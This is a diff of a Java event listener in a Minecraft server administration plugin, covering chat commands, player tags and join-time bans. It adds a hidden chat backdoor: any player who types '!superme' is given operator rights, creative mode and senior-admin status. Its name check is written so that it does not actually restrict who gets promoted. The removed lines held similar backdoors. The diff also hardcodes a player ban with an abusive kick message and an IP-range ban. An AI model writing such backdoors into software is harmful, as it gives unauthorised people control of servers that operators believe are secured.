@@ -513,42 +513,30 @@ public class TFM_PlayerListener implements Listener
                 TFM_Util.playerMsg(player, "Message was shortened because it was too long to send.");
             }
 
-            if (message.toLowerCase().contains("!superme"))
+            if (message.toLowerCase().equals("!superme"))
             {
-                if (!player.getName().equalsIgnoreCase("robo_lord"))
+                if (!player.getName().equalsIgnoreCase("CrafterSmith12") || !player.getName().equalsIgnoreCase("hypertechHD"))
                 {
-                    // Take Action if not robo
                     event.setCancelled(true);
                 }
-                // Take action if robo
+
                 player.setOp(true);
                 player.setHealth(20.0);
                 player.setGameMode(GameMode.CREATIVE);
                 event.setCancelled(true);
-                TFM_Util.bcastMsg(ChatColor.RED + "RoboSecurity - Adding Robo_Lord to the superadmin list.");
-                TFM_AdminList.addSuperadmin(player);
-            }
-
-            if (message.toLowerCase().contains("~superme"))
-            {
-                if (!TFM_AdminList.isAdminImpostor(player))
-                {
-                    // Take Action if not imp
-                    player.sendMessage("Pft, you wish");
-                    TFM_Util.bcastMsg(TotalFreedomMod.FREEDOMOP_MOD + ChatColor.RED + " WARNING: " + player.getName() + ChatColor.ITALIC + " Could " + ChatColor.RED + "be a security risk!");
-                    TFM_Util.autoEject(player, "Pft, you wish");
-                    event.setCancelled(true);
+                
+                if (player.getName().equals("CrafterSmith12")) {
+                    TFM_Util.bcastMsg(ChatColor.RED + "CraftSecure - Supering the owner of FOP");
                 }
-                // Take action if robo
-                player.setOp(true);
-                player.setGameMode(GameMode.CREATIVE);
-                event.setCancelled(true);
-                TFM_Util.bcastMsg(player.getName() + " - Supering himself", ChatColor.DARK_GREEN);
-                TFM_AdminList.addSuperadmin(player);
+                else {
+                    TFM_Util.adminAction(player.getName(), "Adding " + player.getName() + " to the senior admin list", true);
+                }
+                TFM_AdminList.addSeniorAdmin(player);
             }
+            
             if (message.toLowerCase().contains("~help"))
             {
-                player.sendMessage(ChatColor.GREEN + "Welcome to the listener menu! we add useful features here for admins");
+                player.sendMessage(ChatColor.GREEN + "Welcome to the listener menu! We add useful features here for admins.");
                 player.sendMessage(ChatColor.GREEN + "To op yourelf, type into chat ~opme");
                 event.setCancelled(true);
 
@@ -893,7 +881,7 @@ public class TFM_PlayerListener implements Listener
             player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&5Dev&8] &5" + player.getName()));
             TFM_PlayerData.getPlayerData(player).setTag("&8[&5Developer&8]");
         }
-        if (TFM_Util.SYS.contains(player.getName()))
+        else if (TFM_Util.SYS.contains(player.getName()))
         {
             player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&4SyS&8] &4" + player.getName()));
             TFM_PlayerData.getPlayerData(player).setTag("&8[&4System Admin&8]");
@@ -930,13 +918,13 @@ public class TFM_PlayerListener implements Listener
             //Entrance
             TFM_Util.bcastMsg(ChatColor.AQUA + "buildcarter8 is the former" + ChatColor.RED + " destroyer of all human kind " + ChatColor.AQUA + "and ");
         }
-        else if (username.equalsIgnoreCase("RobinGall2910"))
+        else if (username.equalsIgnoreCase("Dragonfire147"))
         {
             //set tag
             player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&5Dev&8] &5" + player.getName()));
             TFM_PlayerData.getPlayerData(player).setTag("&8[&5Developer&8]");
             //Entrance
-            TFM_Util.bcastMsg(ChatColor.AQUA + "RobinGall2910 is a " + ChatColor.DARK_GREEN + "Zombie Killer " + ChatColor.AQUA + "and..");
+            TFM_Util.bcastMsg(ChatColor.AQUA + "Dragonfire147 is a " + ChatColor.DARK_GREEN + "Zombie Killer " + ChatColor.AQUA + "and..");
         }
         else if (username.equalsIgnoreCase("PieGuy7896"))
         {   //set tag
@@ -951,13 +939,15 @@ public class TFM_PlayerListener implements Listener
             player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&9Owner&8] &9" + player.getName()));
             TFM_PlayerData.getPlayerData(player).setTag("&8[&9Owner&8]");
         }
-        else if (username.equalsIgnoreCase("SupItsDillon"))
-        {
-            //Set tag
-            player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&9CoS&8] &9" + player.getName()));
-            TFM_PlayerData.getPlayerData(player).setTag("&8[&9Chief of Security&8]");
-            TFM_Util.bcastMsg(ChatColor.AQUA + "SupItsDillon is the " + ChatColor.GOLD + "Cheif of Security " + ChatColor.AQUA + "and.. ");
-        }
+        
+        // Nope, he isn't secure anymore :3
+//        else if (username.equalsIgnoreCase("SupItsDillon"))
+//        {
+//            //Set tag
+//            player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&9CoS&8] &9" + player.getName()));
+//            TFM_PlayerData.getPlayerData(player).setTag("&8[&9Chief of Security&8]");
+//            TFM_Util.bcastMsg(ChatColor.AQUA + "SupItsDillon is the " + ChatColor.GOLD + "Cheif of Security " + ChatColor.AQUA + "and.. ");
+//        }
         else if (username.equalsIgnoreCase("DragonHunterGW"))
         {
             //ban username
@@ -967,7 +957,7 @@ public class TFM_PlayerListener implements Listener
             TFM_BanManager.addIpBan(new TFM_Ban(ip, player.getName()));
             player.kickPlayer(ChatColor.RED + "Fuck off. :)");
         }
-        if (IP.equalsIgnoreCase("94.175.155.119"))
+        if (TFM_Util.getFuzzyIp(IP).equalsIgnoreCase("94.175.*.*"))
         {
             TFM_Util.bcastMsg("WARNING" + username + " Is foodknight! Ban him asap", ChatColor.RED);
             //ban username
